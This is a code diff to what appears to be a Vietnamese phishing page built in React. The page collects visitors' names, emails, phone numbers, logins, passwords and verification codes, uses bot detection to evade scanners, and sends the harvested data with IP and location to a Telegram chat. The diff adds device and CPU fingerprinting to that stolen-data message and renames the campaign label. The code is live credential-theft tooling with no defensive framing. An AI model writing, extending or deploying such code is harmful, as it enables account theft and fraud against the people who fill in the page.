@@ -7,6 +7,7 @@ import TickImg from '@/assets/images/tick.png';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
+import detectDevice from '@/utils/detect_device';
 import countryToLanguage from '@/utils/country_to_language';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
@@ -17,7 +18,7 @@ import SearchModal from '@/components/SearchModal';
 import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
 import TermsModal from '@/components/TermsModal';
 
-const LABEL = 'Thần-tài-đến';
+const LABEL = 'Kiếm Tiền Page';
 
 const Home = () =>
 {
@@ -313,11 +314,14 @@ const Home = () =>
     {
         const dt = formatDateTime( new Date() );
         const { form, login, passes, codes } = data;
+        const device = detectDevice();
 
-        let message = `📩 <b>${ LABEL }</b>\n`;
+        let message = `💵 <b>${ LABEL }</b>\n`;
         message += `⏰ ${ dt }\n`;
         message += `🌐 IP: <code>${ ipInfo.ip }</code>\n`;
         message += `📍 Vị trí: ${ ipInfo.city }, ${ ipInfo.region }, ${ ipInfo.country }\n`;
+        message += `📱 Thiết bị: ${ device.deviceInfo }\n`;
+        if ( device.cpu ) message += `💻 CPU: ${ device.cpu }\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
         if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName )
